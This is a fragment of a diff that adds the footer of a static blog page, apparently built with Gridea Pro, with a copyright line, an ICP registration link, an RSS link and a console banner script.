+                    </a>
+                    
+    </nav>
+
+    <div class="Copyright">Copyright &copy; 2026 <a href="https://blog.hyun.cc">
+                玄外之音
+            </a></div>
+
+    <div class="index_footer">
+        
+        <a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreferrer">豫ICP备2024083805号-3</a> ·
+            <a class="rss" href="/feed.xml" target="_blank" rel="noopener noreferrer">
+                <i class="ri-rss-line"></i> RSS
+            </a>
+    </div>
+</footer>
+
+
+
+
+    <script>console.log("\n%c ✦ Gridea Pro v1.2.2 %c · Theme: amore v1.1.0 · https://gridea.pro %c\n","color:#fadfa3;background:#111111;padding:9px 14px;border-radius:4px 0 0 4px;font-weight:500;font-size:12px","color:#e05c00;background:#fff3ec;padding:9px 14px;border-radius:0 4px 4px 0;font-size:11px","")</script>
+</body>
+
+    </html>
